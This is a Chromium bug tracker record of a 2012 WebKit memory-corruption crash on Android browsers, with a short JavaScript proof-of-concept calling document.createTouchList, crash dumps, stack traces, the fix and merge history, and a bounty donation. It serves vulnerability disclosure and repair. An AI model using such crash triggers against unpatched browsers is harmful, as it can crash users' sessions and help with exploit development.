# UNKNOWN in WebCore::HTMLDocumentParser::prepareToStopParsing

| Field | Value |
|-------|-------|
| **Issue ID** | [40058625](https://issues.chromium.org/issues/40058625) |
| **Status** | Assigned |
| **Severity** | S4-Minimal |
| **Priority** | P1 |
| **Component** | Blink |
| **Platforms** | Android |
| **Reporter** | ts...@chromium.org |
| **Assignee** | be...@chromium.org |
| **Created** | 2012-05-22 |
| **Bounty** | $1,000.00 |

## Description

Originally reported by Kevin Mahaffey at https://bugs.webkit.org/show_bug.cgi?id=87085


Software affected (Galaxy Nexus, 4.0.2, ICL53F):
- Chrome Beta for Android v0.18.4409.2396
- AOSP Browser v4.0.2
- AOSP Browser v4.0.4

Software not affected:
- Chrome for OSX v18.0.1025.168
- Safari for OSX v5.15 (6534.55.3)

Issue: invoking the createTouchList method on a document object with one or more parameters that are not Touch objects eventually triggers invalid memory accesses.
e.g. 

        for (i = 0; i <= 0x1000; i++)
        {
             if (i>0x999) {
               document.createTouchList(document);
             }
        }

In this example, running on the AOSP 4.0.4 browser on an ARM processor, triggers a segfault, branching to an invalid memory location (in this case $PC is set to 0x2ba85548)

// Registers
r0             0x31e2a8    3269288
r1             0x49dcfb54    1239219028
r2             0x0    0
r3             0x137    311
r4             0x31e2a8    3269288
r5             0x416978    4286840
r6             0x2ba85548    732452168
r7             0x130150    1245520
r8             0x49dcfbf0    1239219184
r9             0x49614eec    1231113964
r10            0x0    0
r11            0x49dcfc04    1239219204
r12            0x17    23
sp             0x49dcfb50    0x49dcfb50
lr             0x482a8b2d    1210747693
pc             0x2ba85548    0x2ba85548
cpsr           0x20000010    536870928


// Stack trace
#0  0x2ba85548 in ?? ()
#1  0x482a8b2c in WebCore::Document::setReadyState (this=0x31e2a8, readyState=<value optimized out>) at external/webkit/Source/WebCore/dom/Document.cpp:1038
#2  0x482f4032 in WebCore::HTMLDocumentParser::prepareToStopParsing (this=0x40b3f8) at external/webkit/Source/WebCore/html/parser/HTMLDocumentParser.cpp:153
#3  0x482f38c4 in WebCore::HTMLDocumentParser::endIfDelayed (this=0x40b3f8) at external/webkit/Source/WebCore/html/parser/HTMLDocumentParser.cpp:426
#4  0x482f3e0a in WebCore::HTMLDocumentParser::resumeParsingAfterYield (this=0x40b3f8) at external/webkit/Source/WebCore/html/parser/HTMLDocumentParser.cpp:197
#5  0x482f53ba in WebCore::HTMLParserScheduler::continueNextChunkTimerFired (this=0x43e758, timer=<value optimized out>) at external/webkit/Source/WebCore/html/parser/HTMLParserScheduler.cpp:86
#6  0x480a131e in WebCore::Timer<MyWebFrame>::fired (this=0x43e770) at external/webkit/Source/WebCore/platform/Timer.h:100
#7  0x48113dc6 in WebCore::ThreadTimers::sharedTimerFiredInternal (this=0x130cb0) at external/webkit/Source/WebCore/platform/ThreadTimers.cpp:112
#8  0x48113e66 in WebCore::ThreadTimers::sharedTimerFired () at external/webkit/Source/WebCore/platform/ThreadTimers.cpp:90


Exploitability: unknown at this point

Proof of Concept:
<html>
  <head>
    <!--      
      Proof of concept for potential createTouchList vulnerability affecting Android devices.
    -->
  </head>
  <body>
    <script>
  
        for (i = 0; i <= 0x1000; i++)
        {
             if (i>0x999) {
               document.createTouchList(document);
             }
        }
    </script>
  </body>
</html>




## Timeline

### ts...@chromium.org (2012-05-22)

Sad tabs my Galaxy Nexus, too.  Hard to triage because the createTouchList method doesn't appear present in the ASAN-ified desktop build.

### ts...@chromium.org (2012-05-22)

For now, let's assume high severity but only beta impact (since android is still beta).

### kc...@chromium.org (2012-05-22)

We do have asan for android. 
+eugenis

### eu...@chromium.org (2012-05-23)

On a dev build I get an assertion failure instead. 

ASSERTION FAILED: !m_deletionHasBegun
third_party/WebKit/Source/WTF/wtf/RefCounted.h(54) : void WTF::RefCountedBase::ref()

thread T10
...
    #4 0x62cb0298 in WTF::RefCountedBase::ref() WTF/wtf/RefCounted.h:54
    #5 0x612d1dba in WebCore::TouchList::append(WTF::PassRefPtr<WebCore::Touch>) WebCore/dom/TouchList.h:48
    #6 0x630dfbd4 in HandleApiCallHelper<false> external/chrome/v8/src/builtins.cc:1115

...

Thread T10 created by T0 here:
    #0 0x4002dfd8 in _ZN6__asan14AsanStackTrace13GetStackTraceEjjj [asan_rtl]
    #1 0x4002b088 in pthread_create [asan_rtl]
    #2 0x419a907e in _Z21dvmCreateInterpThreadP6Objecti dalvik/vm/Thread.cpp:1306
    #3 0x4197d2a4 in dalvik_mterp dalvik/vm/mterp/out/InterpAsm-armv7-a.S:16244
    #4 0x41981b14 in _Z12dvmInterpretP6ThreadPK6MethodP6JValue dalvik/vm/interp/Interp.cpp:1969
    #5 0x419b5a02 in _Z15dvmInvokeMethodP6ObjectPK6MethodP11ArrayObjectS5_P11ClassObjectb dalvik/vm/interp/Stack.cpp:744
    #6 0x419bcf14 in Dalvik_java_lang_reflect_Method_invokeNative dalvik/vm/native/java_lang_reflect_Method.cpp:103
    #7 0x4197d2a4 in dalvik_mterp dalvik/vm/mterp/out/InterpAsm-armv7-a.S:16244
    #8 0x41981b14 in _Z12dvmInterpretP6ThreadPK6MethodP6JValue dalvik/vm/interp/Interp.cpp:1969
    #9 0x419b573c in _Z14dvmCallMethodVP6ThreadPK6MethodP6ObjectbP6JValueSt9__va_list dalvik/vm/interp/Stack.cpp:532
    #10 0x4199f5d2 in CallStaticVoidMethodV dalvik/vm/Jni.cpp:2092
    #11 0x41993148 in Check_CallStaticVoidMethodV dalvik/vm/CheckJni.cpp:1679
    #12 0x412a2f1e in _ZN7_JNIEnv20CallStaticVoidMethodEP7_jclassP10_jmethodIDz dalvik/libnativehelper/include/nativehelper/jni.h:795
    #13 0x412a37d8 in _ZN7android14AndroidRuntime8callMainEPKcP7_jclassiPKS2_ frameworks/base/core/jni/AndroidRuntime.cpp:303
    #14 0x400015fa in _ZN7android10AppRuntime9onStartedEv frameworks/base/cmds/app_process/app_main.cpp:91
    #15 0x412a2d02 in _ZN7androidL52com_android_internal_os_RuntimeInit_nativeFinishInitEP7_JNIEnvP8_jobject frameworks/base/core/jni/AndroidRuntime.cpp:196
    #16 0x41973e74 in dvmPlatformInvoke dalvik/vm/arch/arm/CallEABI.S:275
    #17 0x419a2fe2 in _Z16dvmCallJNIMethodPKjP6JValuePK6MethodP6Thread dalvik/vm/Jni.cpp:1158
    #18 0x4198ee00 in callNeedsCheck dalvik/vm/CheckJni.cpp:136
    #19 0x4197d2a4 in dalvik_mterp dalvik/vm/mterp/out/InterpAsm-armv7-a.S:16244
    #20 0x41981b14 in _Z12dvmInterpretP6ThreadPK6MethodP6JValue dalvik/vm/interp/Interp.cpp:1969
    #21 0x419b573c in _Z14dvmCallMethodVP6ThreadPK6MethodP6ObjectbP6JValueSt9__va_list dalvik/vm/interp/Stack.cpp:532
    #22 0x4199f5d2 in CallStaticVoidMethodV dalvik/vm/Jni.cpp:2092
    #23 0x41993148 in Check_CallStaticVoidMethodV dalvik/vm/CheckJni.cpp:1679
    #24 0x412a2f1e in _ZN7_JNIEnv20CallStaticVoidMethodEP7_jclassP10_jmethodIDz dalvik/libnativehelper/include/nativehelper/jni.h:795
    #25 0x412a3a02 in _ZN7android14AndroidRuntime5startEPKcS2_ frameworks/base/core/jni/AndroidRuntime.cpp:877
    #26 0x40001272 in ~AppRuntime frameworks/base/cmds/app_process/app_main.cpp:28
    #27 0x4114fd2c in __libc_init bionic/libc/bionic/libc_init_dynamic.c:120


### eu...@chromium.org (2012-05-23)

Removing this assertion, I got one wild pointer dereference, and one browser process crash with another assertion:

F/chromium( 7926): [FATAL:build_info.cc(62)] Check failed: !java_exception_info_. info should be set only once.


### in...@chromium.org (2012-05-30)

This seems to affect Android and not Chrome. I could reproduce this using DRT.

Ben, can you please take a look since you seem to have written this code.

### in...@chromium.org (2012-05-30)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-05-30)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=53024892

Uploader: aarya@google.com

Crash Type: UNKNOWN
Crash Address: 0x0000929a5000
Crash State:
  - crash stack -
  WebCore::HTMLDocumentParser::prepareToStopParsing
  WebCore::DocumentWriter::end
  WebCore::DocumentLoader::finishedLoading
  
Regressed: https://cluster-fuzz.appspot.com/revisions?range=132163:132169

Minimized Testcase (0.17 Kb):
Download: https://cluster-fuzz.appspot.com/download/AMIfv96l-TrIwOkaKkjpkrMQ58e3hKFfn4jMsJK_qnnLigy1PkTaC9bqdJFxQebWb3jSYG03pu6wqPPndXJHzLCSC0TDuhj58829Q-vzkbXbcef1erRu99KVKJcglnqe7rZRZfqlKLKPVMxaSfUJmgo0gjNmrsCeDbSsMobtHhlbIuoNF1Z-130
<script>
  
        for (i = 0; i <= 0x1000; i++)
        {
             if (i>0x999) {
               document.createTouchList(document);
             }
        }
    </script>

### be...@chromium.org (2012-05-30)

Looking at it.

### be...@chromium.org (2012-05-30)

I have a fix, can someone CC me on the WebKit bug so I can upload the patch? The bug was introduced with the V8 bindings added in http://trac.webkit.org/changeset/75335

I used Chrome on Android and the Android system browser to verify the fix.

### in...@chromium.org (2012-05-30)

done.

### be...@chromium.org (2012-05-30)

thanks, patch is up for review.

### [Deleted User] (2012-05-31)

benm@ is this pertinent to Chrome for Android as well?

### be...@chromium.org (2012-05-31)

@srikanth yes - once the webkit patch lands I will cherry pick to M18 and let it land naturally through the merge to master.

### in...@chromium.org (2012-05-31)

http://trac.webkit.org/changeset/119158

### cl...@chromium.org (2012-06-02)

ClusterFuzz has detected this issue as fixed in range 140000:140014.

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=53024892

Uploader: aarya@google.com

Crash Type: UNKNOWN
Crash Address: 0x0000929a5000
Crash State:
  - crash stack -
  WebCore::HTMLDocumentParser::prepareToStopParsing
  WebCore::DocumentWriter::end
  WebCore::DocumentLoader::finishedLoading
  
Regressed: https://cluster-fuzz.appspot.com/revisions?range=132163:132169
Fixed: https://cluster-fuzz.appspot.com/revisions?range=140000:140014

Minimized Testcase: https://cluster-fuzz.appspot.com/download/AMIfv96l-TrIwOkaKkjpkrMQ58e3hKFfn4jMsJK_qnnLigy1PkTaC9bqdJFxQebWb3jSYG03pu6wqPPndXJHzLCSC0TDuhj58829Q-vzkbXbcef1erRu99KVKJcglnqe7rZRZfqlKLKPVMxaSfUJmgo0gjNmrsCeDbSsMobtHhlbIuoNF1Z-130

If you suspect that the result above is incorrect, try re-doing that job on the testcase report page.

### sc...@gmail.com (2012-06-06)

@palmer: how do we get this merged to Chrome Beta?

### pa...@google.com (2012-06-07)

Do you mean into Clank Beta (and possibly into Android's general WebView)? Grace will either know how to do it or know whom to point at this. Also gcondra from Android Security (already CC'd, and adding jlarimer).

### [Deleted User] (2012-06-07)

Ben merged this into  Clank's m18 branch - https://gerrit-int.chromium.org/#change,18853

and also into Android ICS/JB releases (http://b/issue?id=6578213) 

Clank's next public update will include this fix

### sc...@gmail.com (2012-06-12)

Merged to M20 for good measure, not that we think it affects desktop in the default config.

M20: http://trac.webkit.org/changeset/120102

### sc...@gmail.com (2012-06-22)

Chromium Security Reward: $1000

@palmer: you said you know Kevin a little, any chance you could ask him if he wants to be cc:ed here so he can see his reward? :)

### pa...@chromium.org (2012-06-26)

Hi Kevin!

### km...@mylookout.com (2012-06-26)

Hi Chris!

Great to hear and thanks to all for fixing the so quickly.  You'll also be happy to know that I plan to donate the reward to EFF :)

BTW, for anyone on the Chrom(e|ium) security team, we're having a pre-Google IO party tonight in SF and you're all invited.  Just send me a note and I'll put you on the list/send out locations.

-Kevin

### sc...@gmail.com (2012-06-26)

Thanks Kevin! We'll up the reward to $1337 on its way to the EFF.

### sc...@gmail.com (2012-06-28)

Reward sent to EFF.

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### js...@chromium.org (2012-12-20)

[Empty comment from Monorail migration]

### [Deleted User] (2013-02-16)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-14)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### js...@chromium.org (2013-11-18)

Bulk release of old security bug reports.


### cl...@chromium.org (2014-02-06)

Bulk update: removing view restriction from closed bugs.

### sh...@chromium.org (2016-06-22)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### is...@google.com (2016-10-02)

This issue was migrated from crbug.com/chromium/129191?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40058625)*
